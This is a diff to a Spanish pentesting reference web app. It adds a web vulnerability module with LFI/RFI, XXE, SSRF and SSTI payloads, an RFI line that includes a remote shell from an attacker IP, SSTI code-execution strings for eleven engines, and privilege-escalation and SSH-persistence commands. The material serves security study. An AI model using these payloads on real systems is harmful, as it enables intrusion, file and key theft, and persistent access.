@@ -304,6 +304,33 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
 .pe-row{display:flex;gap:6px;align-items:flex-start;}
 .pe-ref{width:100%;background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:5px 8px;font-size:11px;font-family:var(--mono);outline:none;resize:vertical;min-height:34px;margin-top:2px;}
 .pe-ref:focus{border-color:#f59e0b;}
+/* Web Vuln module */
+.wv-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;}
+.wv-card{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r2);padding:16px;cursor:pointer;transition:all .15s;position:relative;overflow:hidden;}
+.wv-card:hover{border-color:var(--red);transform:translateY(-2px);box-shadow:0 6px 20px rgba(255,51,68,.12);}
+.wv-card-icon{font-size:26px;margin-bottom:8px;}
+.wv-card-name{font-size:14px;font-weight:700;color:var(--text);margin-bottom:4px;font-family:var(--sans);}
+.wv-card-tag{font-size:10px;font-family:var(--mono);color:var(--red);background:rgba(255,51,68,.1);border:1px solid rgba(255,51,68,.3);border-radius:10px;padding:2px 8px;display:inline-block;}
+.wv-card-sub{font-size:11px;color:var(--text3);margin-top:8px;line-height:1.5;}
+.wv-detail-hd{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid var(--border);}
+.wv-back{background:var(--bg3);border:1px solid var(--border2);color:var(--text2);border-radius:var(--r);padding:6px 12px;cursor:pointer;font-size:11px;font-family:var(--mono);flex-shrink:0;}
+.wv-back:hover{border-color:var(--red);color:var(--red);}
+.wv-sec{margin-bottom:18px;}
+.wv-sec-title{font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase;font-family:var(--mono);margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border);}
+.wv-sec-title.det{color:var(--cyan);}
+.wv-sec-title.pay{color:var(--orange);}
+.wv-sec-title.byp{color:var(--red);}
+.wv-sec-title.desc{color:var(--text2);}
+.wv-desc-txt{font-size:12px;color:var(--text2);line-height:1.7;}
+.wv-subgroup{font-size:11px;font-weight:700;color:var(--purple);font-family:var(--mono);margin:10px 0 4px;}
+.wv-eng-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11px;}
+.wv-eng-table th{background:var(--bg3);color:var(--text3);padding:6px 10px;text-align:left;font-size:10px;border-bottom:1px solid var(--border);}
+.wv-eng-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2);}
+.wv-eng-table td:first-child{color:var(--orange);}
+.wv-eng-table tr:hover td{background:var(--bg3);}
+.wv-files{display:flex;flex-wrap:wrap;gap:6px;}
+.wv-file-chip{font-family:var(--mono);font-size:11px;color:var(--orange);background:var(--bg);border:1px solid var(--border);border-radius:var(--r);padding:3px 8px;cursor:pointer;}
+.wv-file-chip:hover{border-color:var(--orange);}
 
 /* CHAT */
 .chat-panel{width:310px;background:var(--bg2);border-left:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;transition:width .2s;}
@@ -475,6 +502,7 @@ pre.code-block{background:var(--bg);border:1px solid var(--border2);border-radiu
     <div class="tab" onclick="switchTab('commands')" id="tab-commands">⌘ COMANDOS</div>
     <div class="tab" onclick="switchTab('osint')" id="tab-osint">◎ OSINT</div>
     <div class="tab" onclick="switchTab('enum')" id="tab-enum">🗺 ENUMERACIÓN</div>
+    <div class="tab" onclick="switchTab('webvuln')" id="tab-webvuln">🕷 VULN WEB</div>
     <div class="tab" onclick="switchTab('graph')" id="tab-graph">⬡ GRAFO</div>
     <div class="tab" onclick="switchTab('cves')" id="tab-cves">⚠ CVEs</div>
     <div class="tab" onclick="switchTab('audits')" id="tab-audits">✓ AUDITORÍAS</div>
@@ -582,6 +610,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
       <button class="tb-btn" onclick="openSqliModal()" style="font-size:10px;color:#ff44aa;border-color:rgba(255,68,170,.4);" title="Generador de payloads SQL Injection">💉 SQLi</button>
       <button class="tb-btn" onclick="openShellStabModal()" style="font-size:10px;color:var(--cyan);border-color:rgba(0,221,255,.4);" title="Estabilizar shell — TTY upgrade">🐚 Shell</button>
       <button class="tb-btn" onclick="openRevShellModal()" style="font-size:10px;color:var(--red);border-color:rgba(255,51,68,.4);" title="Generador de Reverse Shells">🔌 RevShell</button>
+      <button class="tb-btn" onclick="openDictModal()" style="font-size:10px;color:var(--purple);border-color:rgba(170,85,255,.4);" title="Diccionarios y polyglots">📚 Dicc</button>
       <button class="btn-ai" onclick="openCheatsheetModal()">✦ Cheatsheet</button>
     </div>
     <div class="cmd-list" id="cmdList"><div class="empty-msg">Sin comandos. Sube apuntes o analiza texto.</div></div>
@@ -1222,6 +1251,14 @@ EXEC xp_cmdshell 'whoami';</pre>
     </div><!-- /esec-winad -->
   </div><!-- /panel-enum -->
 
+  <!-- WEB VULN PANEL -->
+  <div class="panel" id="panel-webvuln">
+    <div style="flex:1;overflow-y:auto;padding:16px;">
+      <div id="webvulnList"></div>
+      <div id="webvulnDetail" style="display:none;"></div>
+    </div>
+  </div>
+
   <!-- AUDITS PANEL -->
   <div class="panel" id="panel-audits">
     <div class="ed-toolbar" style="flex-wrap:nowrap;overflow-x:auto;gap:6px;">
@@ -1235,6 +1272,7 @@ EXEC xp_cmdshell 'whoami';</pre>
         <button class="audit-type-btn" onclick="selectAudit('forensics',this)">🔬 Forense</button>
         <button class="audit-type-btn" onclick="selectAudit('mobile',this)">📱 Móvil</button>
         <button class="audit-type-btn" onclick="selectAudit('wordpress',this)">📰 WordPress</button>
+        <button class="audit-type-btn" onclick="selectAudit('web-methodology',this)">🧭 Metodología Web</button>
       </div>
       <div style="flex:1"></div>
       <span id="auditProgress" style="font-size:11px;font-family:var(--mono);color:var(--green);flex-shrink:0;"></span>
@@ -1635,6 +1673,18 @@ export TERM=xterm-256color</pre>
     <div id="rsOutput"></div>
     <div class="modal-actions">
       <button class="btn-outline" onclick="closeModal('revShellModal')">Cerrar</button>
+    </div>
+  </div>
+</div>
+
+<!-- DICTIONARIES & POLYGLOTS MODAL -->
+<div class="overlay" id="dictModal">
+  <div class="modal" style="max-width:720px;width:96vw;">
+    <h3>📚 Diccionarios y polyglots</h3>
+    <p style="color:var(--text3);font-size:12px;margin:0;">Payloads polyglot, rutas de SecLists y enumeración de parámetros ocultos.</p>
+    <div id="dictBody" style="margin-top:6px;"></div>
+    <div class="modal-actions">
+      <button class="btn-outline" onclick="closeModal('dictModal')">Cerrar</button>
     </div>
   </div>
 </div>
@@ -2705,7 +2755,7 @@ async function loadOsintHistory(){
   try{
     const hist=await API.get('/api/osint/history');
     document.getElementById('osintHistoryList').innerHTML=hist.slice(0,10).map(h=>
-      `<div class="history-row" onclick="loadOsintHistResult(${h.id},${JSON.stringify(h.type)})">
+      `<div class="history-row" onclick='loadOsintHistResult(${h.id},${jarg(h.type)})'>
         <span style="color:var(--text3);font-size:9px">${esc(h.type)}</span><br>${esc(h.query.substring(0,22))}
       </div>`
     ).join('')||'<div style="padding:4px 8px;font-size:10px">Sin historial</div>';
@@ -3048,7 +3098,7 @@ function formatAIText(text){
 
 // ─── TABS ─────────────────────────────────────────────────────────────────────
 function switchTab(name){
-  ['editor','tools','commands','osint','enum','graph','cves','audits','mitre','forensic'].forEach(t=>{
+  ['editor','tools','commands','osint','enum','webvuln','graph','cves','audits','mitre','forensic'].forEach(t=>{
     document.getElementById('panel-'+t).classList.toggle('show',t===name);
     document.getElementById('tab-'+t).classList.toggle('active',t===name);
   });
@@ -3058,6 +3108,7 @@ function switchTab(name){
   if(name==='audits' && !S.currentAudit) selectAudit('web-app', document.querySelector('.audit-type-btn'));
   if(name==='mitre') loadMitre();
   if(name==='enum') initEnumSaveButtons();
+  if(name==='webvuln') renderWebVulnList();
 }
 
 // ─── MODALS ───────────────────────────────────────────────────────────────────
@@ -3503,6 +3554,22 @@ const AUDIT_TEMPLATES={
       {id:'wp8',text:'Comprobar versión de WordPress y del tema activo frente a CVEs públicos',sev:'medium',cmds:['wpscan --url http://target --enumerate vt']},
     ]},
   ]},
+  'web-methodology':{name:'Metodología Web',icon:'🧭',phases:[
+    {name:'Reconocimiento',items:[
+      {id:'wm1',text:'Nmap -sCV (puertos y versiones)',sev:'high',cmds:['nmap -sCV -p- --min-rate 5000 target']},
+      {id:'wm2',text:'Wappalyzer / whatweb (fingerprinting de tecnologías)',sev:'medium',cmds:['whatweb -a 3 http://target']},
+      {id:'wm3',text:'Ver código fuente (Ctrl+U) — comentarios, credenciales hardcodeadas, rutas',sev:'medium',cmds:['curl -s http://target | grep -iE "password|api|key|todo|fixme|<!--"']},
+      {id:'wm4',text:'robots.txt y sitemap',sev:'low',cmds:['curl http://target/robots.txt','curl http://target/sitemap.xml']},
+      {id:'wm5',text:'Dirsearch / GoBuster recursivo (-r) — directorios y ficheros (-x php,html,txt,xml)',sev:'high',cmds:['dirsearch -u http://target -r -x 403,404 -e php,html,txt,xml','gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,xml']},
+      {id:'wm6',text:'Si es CMS → herramienta específica (WPScan para WordPress)',sev:'medium',cmds:['wpscan --url http://target --enumerate u,vp,vt']},
+    ]},
+    {name:'Análisis y Explotación',items:[
+      {id:'wm7',text:'Identificar funcionalidades: formularios (SQLi/SSTI/XSS), uploads (File Upload), parámetros de fichero (Path Traversal/LFI), parámetros con URL (SSRF)',sev:'high'},
+      {id:'wm8',text:'Interceptar peticiones "ocultas" con Burp (HTTP History)',sev:'medium'},
+      {id:'wm9',text:'Probar cada vulnerabilidad según el contexto',sev:'critical'},
+      {id:'wm10',text:'Documentar pruebas realizadas (aunque no haya vulnerabilidad)',sev:'low'},
+    ]},
+  ]},
 };
 
 S.currentAudit='web-app';
@@ -3884,6 +3951,13 @@ function esc(s){
   return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
+// JSON string safe to embed inside a single-quoted HTML attribute (onclick='...').
+// Keeps double quotes (JSON delimiters) literal; escapes &, ', <, > so the attribute
+// and the surrounding markup don't break. Browser decodes entities back to valid JS.
+function jarg(x){
+  return JSON.stringify(x).replace(/&/g,'&amp;').replace(/'/g,'&#39;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
 function tick(){document.getElementById('statusTime').textContent=new Date().toLocaleTimeString('es-ES');}
 
 // ─── INIT ─────────────────────────────────────────────────────────────────────
@@ -4010,12 +4084,12 @@ function renderSqli(){
   const out=document.getElementById('sqliOutput');
   out.innerHTML=list.map(p=>{
     const payload=useUser?p.u:p.g;
-    const pj=JSON.stringify(payload);
+    const pj=jarg(payload);
     return `<div class="enum-cmd-card">
       <div class="enum-cmd-row">
         <div class="enum-cmd-code">${esc(payload)}</div>
         <button class="enum-copy-btn" onclick='enumCopy(this,${pj})'>⎘ Copiar</button>
-        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${pj},${JSON.stringify(p.d)},"web","SQL Injection","sqli",["sqli","web"])'>💾</button>
+        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${pj},${jarg(p.d)},"web","SQL Injection","sqli",["sqli","web"])'>💾</button>
       </div>
       <div class="enum-cmd-desc">${esc(p.d)}</div>
     </div>`;
@@ -4040,14 +4114,33 @@ const PE_SEED=[
    det:"type C:\\Users\\USUARIO\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    exp:"type C:\\Users\\USUARIO\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
    ref:''},
+  {id:'writable-binary', name:'Sobreescritura de binario con permisos de escritura',
+   det:"sudo -l   # binario/script ejecutable como otro usuario\nls -l /ruta/al/binario   # comprobar permiso de escritura (w)",
+   exp:"echo '/bin/bash' > /ruta/al/binario\nsudo -u usuario_objetivo /ruta/al/binario",
+   ref:''},
+  {id:'rbash-bypass', name:'Bypass de rbash (Restricted Bash)',
+   det:"# Prompt muestra rbash, o 'cd /' devuelve \"restricted\"",
+   exp:"# Opción 1 — SSH sin perfil:\nssh usuario@IP -t \"bash --noprofile\"\n\n# Opción 2 — vía vi:\nvi\n:set shell=/bin/bash\n:shell\n\n# Opción 3 — vía python:\npython3 -c 'import os; os.system(\"/bin/bash\")'",
+   ref:''},
+  {id:'ssh-persist', name:'Persistencia con clave SSH',
+   det:"ls -ld ~/.ssh/   # comprobar acceso de escritura a ~/.ssh del usuario",
+   exp:"ssh-keygen -t rsa -f ./key\ncat key.pub >> ~/.ssh/authorized_keys\nssh -i key usuario@IP",
+   ref:''},
 ];
 
 function loadPeTechniques(){
+  let saved=null;
   try{
     const raw=localStorage.getItem('cyberkb_privesc');
-    if(raw) return JSON.parse(raw);
+    if(raw) saved=JSON.parse(raw);
   }catch(e){}
-  return JSON.parse(JSON.stringify(PE_SEED));
+  if(!saved) return JSON.parse(JSON.stringify(PE_SEED));
+  // Merge: añadir técnicas de seed nuevas que aún no estén guardadas (por id)
+  const ids=new Set(saved.map(t=>t.id));
+  let changed=false;
+  PE_SEED.forEach(s=>{ if(!ids.has(s.id)){ saved.push(JSON.parse(JSON.stringify(s))); changed=true; } });
+  if(changed) savePeTechniques(saved);
+  return saved;
 }
 function savePeTechniques(arr){
   try{localStorage.setItem('cyberkb_privesc',JSON.stringify(arr));}catch(e){}
@@ -4058,18 +4151,18 @@ function renderPeTechniques(){
   const box=document.getElementById('peCards');
   if(!arr.length){box.innerHTML='<div class="empty-msg">Sin técnicas. Pulsa "+ Nueva técnica".</div>';return;}
   box.innerHTML=arr.map(t=>{
-    const dj=JSON.stringify(t.det), ej=JSON.stringify(t.exp);
+    const dj=jarg(t.det), ej=jarg(t.exp);
     return `<div class="pe-card">
       <div class="pe-card-hd">
         <span class="pe-card-name">⚡ ${esc(t.name)}</span>
-        <button class="pe-del" onclick='deletePeTechnique(${JSON.stringify(t.id)})'>✕ Eliminar</button>
+        <button class="pe-del" onclick='deletePeTechnique(${jarg(t.id)})'>✕ Eliminar</button>
       </div>
       <div class="pe-block">
         <div class="pe-label det">Detección</div>
         <div class="pe-row">
           <div class="pe-code">${esc(t.det)}</div>
           <button class="enum-copy-btn" onclick='enumCopy(this,${dj})'>⎘</button>
-          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${dj},${JSON.stringify("PrivEsc detección: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
+          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${dj},${jarg("PrivEsc detección: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
         </div>
       </div>
       <div class="pe-block">
@@ -4077,7 +4170,7 @@ function renderPeTechniques(){
         <div class="pe-row">
           <div class="pe-code">${esc(t.exp)}</div>
           <button class="enum-copy-btn" onclick='enumCopy(this,${ej})'>⎘</button>
-          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${ej},${JSON.stringify("PrivEsc explotación: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
+          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${ej},${jarg("PrivEsc explotación: "+t.name)},"linux","PrivEsc","privesc",["privesc"])'>💾</button>
         </div>
       </div>
       <div class="pe-block" style="margin-bottom:0;">
@@ -4138,7 +4231,7 @@ function openShellStabModal(){
         <div class="enum-cmd-desc">${esc(s.d)}</div>
       </div>`;
     }
-    const cj=JSON.stringify(s.cmd);
+    const cj=jarg(s.cmd);
     return `<div class="enum-cmd-card">
       <div class="enum-cmd-row">
         <div class="enum-cmd-code">${esc(s.cmd)}</div>
@@ -4180,16 +4273,269 @@ function renderRevShell(){
     ];
   }
   out.innerHTML=cards.map(c=>{
-    const cj=JSON.stringify(c.cmd);
+    const cj=jarg(c.cmd);
     return `<div class="enum-cmd-card">
       <div class="enum-cmd-row" style="align-items:flex-start;">
         <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(c.cmd)}</div>
         <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
-        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${cj},${JSON.stringify(c.d)},${JSON.stringify(c.os)},"Reverse Shell","revshell",["revshell"])'>💾</button>
+        <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${cj},${jarg(c.d)},${jarg(c.os)},"Reverse Shell","revshell",["revshell"])'>💾</button>
       </div>
       <div class="enum-cmd-desc">${esc(c.d)}</div>
     </div>`;
   }).join('');
+}
+
+// ─── WEB VULNERABILITIES MODULE ───────────────────────────────────────────────
+const WEB_VULNS=[
+  {
+    id:'path-traversal', icon:'📂', name:'Path Traversal / LFI / RFI', tag:'File Inclusion',
+    sub:'Lectura de ficheros arbitrarios y ejecución remota vía parámetros de ruta.',
+    desc:'Un parámetro de la aplicación incluye o lee ficheros del servidor sin sanitizar la ruta. Path Traversal permite salir del directorio esperado; LFI incluye ficheros locales (a veces con ejecución de código); RFI incluye ficheros remotos controlados por el atacante.',
+    detection:'Parámetro que acepta rutas de fichero: filename=, file=, path=, page=, include=, template=. Probar con un fichero conocido y observar si su contenido aparece en la respuesta.',
+    payloads:[
+      {code:'../../../../etc/passwd', d:'Traversal básico hacia /etc/passwd'},
+      {code:'....//....//etc/passwd', d:'Bypass de filtro no recursivo (elimina "../" una vez)'},
+      {code:'..%2F..%2F..%2Fetc/passwd', d:'URL encoding de las barras'},
+      {code:'..%252F..%252Fetc/passwd', d:'Double URL encoding (%25 = %)'},
+      {code:'../../../../etc/passwd%00.jpg', d:'Null byte — trunca la extensión forzada (PHP < 5.3.4)'},
+      {code:'http://IP_ATACANTE/shell.php', d:'RFI — incluir shell remota (requiere allow_url_include=On)'},
+    ],
+    files:['/etc/passwd','/etc/shadow','config.php','wp-config.php','~/.ssh/id_rsa','.bash_history'],
+  },
+  {
+    id:'xxe', icon:'📄', name:'XXE (XML External Entity)', tag:'XML',
+    sub:'Inyección de entidades externas en parsers XML → lectura de ficheros y SSRF.',
+    desc:'El servidor parsea XML controlado por el usuario con las entidades externas habilitadas. Permite leer ficheros locales, hacer SSRF e incluso RCE en ciertos contextos.',
+    detection:'Cabecera Content-Type o Accept con application/xml; endpoint que espera XML (SOAP, APIs, uploads de documentos como .docx/.svg).',
+    payloads:[
+      {code:`<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>`, d:'Payload base — leer /etc/passwd vía entidad externa'},
+      {code:`<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">\n]>\n<root>&xxe;</root>`, d:'Leer clave privada SSH del usuario'},
+      {code:`<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">\n]>\n<root>&xxe;</root>`, d:'Leer código fuente PHP en base64 (evita que el parser rompa con < >)'},
+    ],
+  },
+  {
+    id:'ssrf', icon:'🌐', name:'SSRF (Server-Side Request Forgery)', tag:'Request Forgery',
+    sub:'Forzar al servidor a hacer peticiones a destinos internos.',
+    desc:'La aplicación hace una petición HTTP a una URL controlada por el usuario. Permite alcanzar servicios internos (127.0.0.1, metadata cloud, red interna) que no son accesibles desde fuera.',
+    detection:'Parámetro cuyo valor es una URL: url=, uri=, path=, dest=, redirect=, fetch=, callback=, webhook=.',
+    bypassGroups:[
+      {name:'Sin restricción', items:[{code:'http://127.0.0.1/admin', d:'Acceso directo a localhost'}]},
+      {name:'Bypass de blacklist', items:[
+        {code:'http://127.1/', d:'Forma corta de 127.0.0.1'},
+        {code:'http://2130706433/', d:'127.0.0.1 en decimal'},
+        {code:'http://[::1]/', d:'Localhost en IPv6'},
+      ]},
+      {name:'Bypass de whitelist', items:[
+        {code:'http://dominio-permitido@127.0.0.1/', d:'Userinfo — todo antes de @ se ignora como host'},
+        {code:'http://127.0.0.1#dominio-permitido/', d:'Fragmento — el # corta la URL real'},
+      ]},
+      {name:'Open Redirect encadenado', items:[
+        {code:'http://app-permitida/redirect?url=http://127.0.0.1/admin', d:'Usar un redirect de un dominio permitido'},
+      ]},
+    ],
+    note:'💡 Usa Burp Intruder para escanear la red interna: itera IPs (192.168.x.x, 10.x.x.x) y puertos comunes en el parámetro vulnerable para mapear servicios internos.',
+  },
+  {
+    id:'ssti', icon:'🧩', name:'SSTI (Server-Side Template Injection)', tag:'Template Injection',
+    sub:'Inyección en motores de plantillas → de reflected a RCE.',
+    desc:'La entrada del usuario se concatena directamente en una plantilla del lado servidor. Según el motor puede escalar de simple inyección a ejecución remota de comandos.',
+    detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
+    engineTable:[
+      {payload:'{{7*7}}',       result:'49', engine:'Jinja2 / Tornado (Python) o Twig (PHP)'},
+      {payload:'<%= 7*7 %>',    result:'49', engine:'ERB (Ruby)'},
+      {payload:'${7*7}',        result:'49', engine:'FreeMarker (Java)'},
+      {payload:'@(7*7)',        result:'49', engine:'Razor (.NET)'},
+      {payload:'#{7*7}',        result:'49', engine:'Ruby / Thymeleaf'},
+    ],
+    payloads:[
+      {code:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`, d:'RCE en Jinja2 — ejecuta "id" vía os.popen'},
+    ],
+  },
+];
+
+function renderWebVulnList(){
+  document.getElementById('webvulnDetail').style.display='none';
+  const list=document.getElementById('webvulnList');
+  list.style.display='block';
+  const probeOpts=['{{7*7}}','<%= 7*7 %>','${7*7}','@(7*7)','#{7*7}','{7*7}','#set($x=7*7)$x']
+    .map(p=>`<option value="${esc(p)}">${esc(p)}</option>`).join('');
+  list.innerHTML=`<div style="margin-bottom:14px;">
+    <div style="font-size:15px;font-weight:700;color:var(--text);font-family:var(--sans);">🕷 Vulnerabilidades Web</div>
+    <div style="font-size:11px;color:var(--text3);margin-top:2px;">Referencia de detección, payloads y bypass. Solo para entornos autorizados.</div>
+  </div>
+  <div class="enum-generator" style="margin-bottom:16px;border-color:rgba(0,221,255,.3);">
+    <div class="enum-gen-title">🧪 Identificador de motor SSTI</div>
+    <div class="enum-gen-row">
+      <span class="enum-gen-label">Payload probado</span>
+      <select class="enum-gen-sel" id="sstiProbe" onchange="identifySsti()" style="flex:1;">${probeOpts}</select>
+    </div>
+    <div class="enum-gen-row" style="align-items:flex-start;">
+      <span class="enum-gen-label">Respuesta vista</span>
+      <input type="text" class="enum-gen-input" id="sstiResp" oninput="identifySsti()" placeholder="Pega lo que devolvió el servidor (ej: 49)">
+    </div>
+    <div id="sstiIdOut" style="margin-top:8px;"></div>
+  </div>
+  <div class="wv-grid">${WEB_VULNS.map(v=>`
+    <div class="wv-card" onclick="openWebVuln('${v.id}')">
+      <div class="wv-card-icon">${v.icon}</div>
+      <div class="wv-card-name">${esc(v.name)}</div>
+      <span class="wv-card-tag">${esc(v.tag)}</span>
+      <div class="wv-card-sub">${esc(v.sub)}</div>
+    </div>`).join('')}</div>`;
+  identifySsti();
+}
+
+function wvPayloadCard(code, desc){
+  const cj=jarg(code);
+  return `<div class="enum-cmd-card">
+    <div class="enum-cmd-row" style="align-items:flex-start;">
+      <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(code)}</div>
+      <button class="enum-copy-btn" onclick='enumCopy(this,${cj})'>⎘ Copiar</button>
+      <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${cj},${jarg(desc||'')},"web","Web Exploitation","web-exploitation",["web-exploitation"])'>💾</button>
+    </div>
+    ${desc?`<div class="enum-cmd-desc">${esc(desc)}</div>`:''}
+  </div>`;
+}
+
+function openWebVuln(id){
+  const v=WEB_VULNS.find(x=>x.id===id);
+  if(!v) return;
+  document.getElementById('webvulnList').style.display='none';
+  const d=document.getElementById('webvulnDetail');
+  d.style.display='block';
+  let html=`<div class="wv-detail-hd">
+    <button class="wv-back" onclick="renderWebVulnList()">← Volver</button>
+    <span style="font-size:22px;">${v.icon}</span>
+    <div style="flex:1;">
+      <div style="font-size:16px;font-weight:700;color:var(--text);font-family:var(--sans);">${esc(v.name)}</div>
+      <span class="wv-card-tag">${esc(v.tag)}</span>
+    </div>
+  </div>`;
+
+  html+=`<div class="wv-sec"><div class="wv-sec-title desc">Descripción</div><div class="wv-desc-txt">${esc(v.desc)}</div></div>`;
+  html+=`<div class="wv-sec"><div class="wv-sec-title det">Cómo detectarla</div><div class="wv-desc-txt">${esc(v.detection)}</div></div>`;
+
+  if(v.engineTable){
+    html+=`<div class="wv-sec"><div class="wv-sec-title det">Identificación de motor</div>
+      <table class="wv-eng-table"><thead><tr><th>Payload</th><th>Resultado</th><th>Motor</th></tr></thead><tbody>
+      ${v.engineTable.map(r=>`<tr><td>${esc(r.payload)}</td><td>${esc(r.result)}</td><td>${esc(r.engine)}</td></tr>`).join('')}
+      </tbody></table></div>`;
+  }
+
+  if(v.payloads){
+    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Payloads</div>${v.payloads.map(p=>wvPayloadCard(p.code,p.d)).join('')}</div>`;
+  }
+
+  if(v.bypassGroups){
+    html+=`<div class="wv-sec"><div class="wv-sec-title byp">Bypasses</div>`;
+    v.bypassGroups.forEach(g=>{
+      html+=`<div class="wv-subgroup">${esc(g.name)}</div>${g.items.map(p=>wvPayloadCard(p.code,p.d)).join('')}`;
+    });
+    html+=`</div>`;
+  }
+
+  if(v.files){
+    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Ficheros clave a leer</div><div class="wv-files">${v.files.map(f=>`<span class="wv-file-chip" onclick='enumCopy(this,${jarg(f)})' title="Copiar">${esc(f)}</span>`).join('')}</div></div>`;
+  }
+
+  if(v.note){
+    html+=`<div class="enum-note">${esc(v.note)}</div>`;
+  }
+
+  d.innerHTML=html;
+}
+
+// ─── SSTI ENGINE IDENTIFIER ───────────────────────────────────────────────────
+// probe = payload que devuelve 49 en ese motor; rce = payload de ejecución
+const SSTI_ENGINES=[
+  {engine:'Jinja2',    lang:'Python',  probe:'{{7*7}}',    rce:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`},
+  {engine:'Tornado',   lang:'Python',  probe:'{{7*7}}',    rce:`{% import os %}{{ os.popen('id').read() }}`},
+  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`${__import__('os').popen('id').read()}`},
+  {engine:'ERB',       lang:'Ruby',    probe:'<%= 7*7 %>', rce:'<%= `id` %>'},
+  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`},
+  {engine:'Velocity',  lang:'Java',    probe:'#set($x=7*7)$x', rce:`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`},
+  {engine:'Twig',      lang:'PHP',     probe:'{{7*7}}',    rce:`{{['id']|filter('system')}}`},
+  {engine:'Smarty',    lang:'PHP',     probe:'{7*7}',      rce:`{system('id')}`},
+  {engine:'Nunjucks',  lang:'Node.js', probe:'{{7*7}}',    rce:`{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`},
+  {engine:'Razor',     lang:'.NET',    probe:'@(7*7)',     rce:`@{ System.Diagnostics.Process.Start("cmd.exe","/c id"); }`},
+  {engine:'Thymeleaf', lang:'Java',    probe:'#{7*7}',     rce:`[[\${T(java.lang.Runtime).getRuntime().exec('id')}]]`},
+];
+
+function identifySsti(){
+  const probe=document.getElementById('sstiProbe').value;
+  const resp=(document.getElementById('sstiResp').value||'').trim();
+  const out=document.getElementById('sstiIdOut');
+  const candidates=SSTI_ENGINES.filter(e=>e.probe===probe);
+  const evaluated=resp.includes('49');
+  let banner='';
+  if(resp){
+    banner=evaluated
+      ? `<div class="enum-note" style="background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.3);color:var(--green);">✓ La respuesta contiene "49" — la plantilla evalúa expresiones. SSTI confirmado.</div>`
+      : `<div class="enum-note">La respuesta no contiene "49". Si el payload se refleja sin evaluar, prueba otro motor/sintaxis o revisa el contexto.</div>`;
+  }
+  out.innerHTML=banner+`<div style="font-size:11px;color:var(--text3);margin:8px 0 4px;font-family:var(--mono);">Motores que responden a <span style="color:var(--orange)">${esc(probe)}</span> con RCE:</div>`+
+    candidates.map(e=>`
+      <div class="enum-cmd-card">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px;">
+          <span style="font-size:12px;font-weight:700;color:var(--cyan);font-family:var(--mono);">${esc(e.engine)}</span>
+          <span style="font-size:9px;color:var(--text3);background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;font-family:var(--mono);">${esc(e.lang)}</span>
+        </div>
+        <div class="enum-cmd-row" style="align-items:flex-start;">
+          <div class="enum-cmd-code" style="white-space:pre-wrap;word-break:break-all;">${esc(e.rce)}</div>
+          <button class="enum-copy-btn" onclick='enumCopy(this,${jarg(e.rce)})'>⎘ Copiar</button>
+          <button class="enum-save-btn" title="Guardar en KB" onclick='saveCmdKB(this,${jarg(e.rce)},${jarg('SSTI RCE — '+e.engine+' ('+e.lang+')')},"web","Web Exploitation","web-exploitation",["web-exploitation","ssti"])'>💾</button>
+        </div>
+      </div>`).join('');
+}
+
+// ─── DICTIONARIES & POLYGLOTS ─────────────────────────────────────────────────
+const DICT_POLYGLOTS=[
+  {code:"${{<%[%'\"}}%\\", d:"Polyglot SSTI — provoca error/eval en múltiples motores de plantillas", save:true},
